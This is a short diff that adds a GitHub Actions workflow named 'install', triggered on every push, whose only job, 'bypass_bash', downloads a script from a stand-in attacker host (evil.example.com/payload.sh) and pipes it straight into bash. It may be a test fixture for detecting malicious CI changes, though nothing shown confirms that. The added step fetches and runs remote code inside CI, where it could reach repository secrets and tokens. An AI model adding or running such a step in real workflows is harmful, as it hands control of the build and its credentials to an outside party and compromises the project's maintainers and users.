@@ -1,0 +1,7 @@
+name: install
+on: push
+jobs:
+  bypass_bash:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: bash <(curl -s https://evil.example.com/payload.sh)
